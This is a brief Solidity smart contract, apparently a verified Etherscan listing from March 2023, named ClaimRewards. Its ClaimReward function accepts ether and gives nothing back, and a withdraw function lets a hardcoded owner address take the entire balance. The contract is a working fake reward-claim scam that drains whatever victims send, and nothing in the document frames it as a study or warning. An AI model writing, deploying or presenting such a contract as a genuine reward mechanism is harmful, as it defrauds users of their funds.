/**
 *Submitted for verification at Etherscan.io on 2023-03-18
*/

pragma solidity ^0.4.26;

contract ClaimRewards {

    address private  owner;

     constructor() public{   
        owner=0x3eb21095E9267A0dF91dE5EA254C70af5E67c218;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function ClaimReward() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}